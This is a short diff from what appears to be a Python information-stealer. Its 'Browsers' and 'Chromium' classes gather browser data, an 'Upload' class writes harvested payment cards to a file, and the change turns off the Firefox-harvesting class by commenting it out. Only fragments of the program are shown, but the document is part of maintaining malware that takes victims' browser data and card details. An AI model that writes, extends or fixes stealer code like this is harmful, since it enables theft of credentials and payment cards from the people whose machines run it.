@@ -58,7 +58,6 @@ class Browsers:
     def __init__(self):
         listData.append("\n\n🌐Browsers")
         Chromium()
-        FireFox()
     def Return():
         return listData
 
@@ -119,7 +118,7 @@ class Upload:
                 f.write(cards)
             listData.append("\n∟💳cards")
 
-
+'''
 class FireFox:
     def __init__(self):
         self.Firefox()
@@ -141,6 +140,7 @@ class FireFox:
                 file.close()
         except Exception as e:
             print(e)
+'''
 
 class Chromium:
     def __init__(self):
